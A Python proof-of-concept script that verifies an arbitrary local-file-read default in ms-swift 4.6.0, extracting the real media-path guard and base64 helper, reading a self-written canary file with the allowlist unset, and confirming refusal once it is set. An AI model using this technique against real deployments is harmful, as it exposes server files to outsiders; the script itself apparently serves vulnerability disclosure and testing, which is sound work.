"""ms-swift 4.6.0 deploy media local-file read (default allow-all).

The PoC extracts the real `SafeMediaPath` class and the real
`MultiModalRequestMixin.to_base64` function from the pinned 4.6.0 source.
With SWIFT_MEDIA_ALLOWED_DIRS unset, to_base64 reads an arbitrary canary file
and returns it base64-encoded.  Setting the allowlist to an unrelated empty
directory makes the same call fail, proving the guard is present but opt-in.
"""

from __future__ import annotations

import ast
import base64
import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
import poclib  # noqa: E402

# The upstream function only uses Image.Image in an isinstance check; a stub
# class is sufficient and keeps the case independent of Pillow.
class _ImageClass:
    pass


Image = type("ImageModule", (), {"Image": _ImageClass})


def _extract(source_path: Path, name: str, kind):
    text = source_path.read_text(encoding="utf-8")
    tree = ast.parse(text)
    for node in ast.walk(tree):
        if isinstance(node, kind) and node.name == name:
            segment = ast.get_source_segment(text, node)
            if not segment:
                poclib.fail(f"could not extract {name} from {source_path}")
            return segment, node.lineno, text
    poclib.fail(f"{name} not found in {source_path}")


def _get_env_args(name, type_, default):
    # The upstream helper reads SWIFT_<NAME>; mirror only the one guard we need.
    value = os.environ.get(name.upper())
    if value is None:
        value = os.environ.get(name)
    if value is None:
        return default
    return type_(value) if type_ is not str else value


def _load_safe_media(media_path: Path):
    segment, line, text = _extract(media_path, "SafeMediaPath", ast.ClassDef)
    ns = {"os": os, "get_env_args": _get_env_args}
    exec(compile(segment, str(media_path), "exec"), ns)
    return ns["SafeMediaPath"], line, segment


def _load_to_base64(protocol_path: Path, safe_cls):
    segment, line, text = _extract(protocol_path, "to_base64", ast.FunctionDef)
    ns = {"os": os, "base64": base64, "Image": Image, "SafeMediaPath": safe_cls}
    exec(compile(segment, str(protocol_path), "exec"), ns)
    return ns["to_base64"], line, segment


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    media_path = poclib.UPSTREAM / "ms-swift-4.6.0/swift/utils/media_utils.py"
    protocol_path = poclib.UPSTREAM / "ms-swift-4.6.0/swift/infer_engine/protocol.py"
    for path in (media_path, protocol_path):
        if not path.is_file():
            poclib.fail(f"missing pinned upstream source: {path}")

    poclib.start_marker()
    os.environ.pop("SWIFT_MEDIA_ALLOWED_DIRS", None)
    safe_cls, media_line, media_src = _load_safe_media(media_path)
    to_base64, proto_line, proto_src = _load_to_base64(protocol_path, safe_cls)

    canary = poclib.EVIDENCE_DIR / "victim-secret.txt"
    canary.write_text(poclib.MARKER_TEXT, encoding="utf-8")
    encoded = to_base64(str(canary))
    decoded = base64.b64decode(encoded).decode("utf-8")
    if decoded != poclib.MARKER_TEXT:
        poclib.fail("the upstream to_base64 path did not return the canary content",
                    decoded=decoded[:200])

    # Negative control: the same call must be refused when the opt-in guard is set.
    allowed = poclib.EVIDENCE_DIR / "allowed-empty"
    allowed.mkdir(exist_ok=True)
    os.environ["SWIFT_MEDIA_ALLOWED_DIRS"] = str(allowed)
    refused = None
    try:
        to_base64(str(canary))
    except Exception as exc:
        refused = f"{type(exc).__name__}: {exc}"
    if not refused:
        poclib.fail("SafeMediaPath did not refuse the canary when SWIFT_MEDIA_ALLOWED_DIRS was set")

    poclib.mark(decoded)
    log = [
        f"upstream_media={poclib.rel(media_path)}",
        f"upstream_protocol={poclib.rel(protocol_path)}",
        f"safe_media_line={media_line}",
        f"to_base64_line={proto_line}",
        f"media_sha256={poclib.sha256_file(media_path)}",
        f"protocol_sha256={poclib.sha256_file(protocol_path)}",
        "SWIFT_MEDIA_ALLOWED_DIRS unset -> SafeMediaPath.check returns path unchanged",
        f"to_base64(canary) -> base64 decodes to {decoded!r}",
        f"SWIFT_MEDIA_ALLOWED_DIRS={allowed} -> {refused}",
    ]
    (poclib.EVIDENCE_DIR / "log.txt").write_text("\n".join(log) + "\n", encoding="utf-8")

    poclib.finish_verified({
        "transport": {
            "type": "verbatim upstream class/function (AST source segments)",
            "upstream": "ms-swift v4.6.0",
            "media_source": poclib.rel(media_path),
            "protocol_source": poclib.rel(protocol_path),
            "source_sha256": {
                "media": poclib.sha256_file(media_path),
                "protocol": poclib.sha256_file(protocol_path),
            },
            "sink": "SafeMediaPath.check -> builtins.open(mm_data,'rb') -> base64",
            "default": "SWIFT_MEDIA_ALLOWED_DIRS unset -> allow all local paths",
            "allowlisted_control": refused,
        },
        "request_response": [
            {"request": "to_base64('/path/victim-secret.txt') with guard unset",
             "result": f"base64 returned and decoded to {decoded!r}"},
            {"request": "same call with SWIFT_MEDIA_ALLOWED_DIRS=<empty dir>",
             "result": refused},
        ],
        "state_before": "marker=ABSENT",
        "state_after": "marker contains the canary text read through the upstream function",
    })


if __name__ == "__main__":
    main()
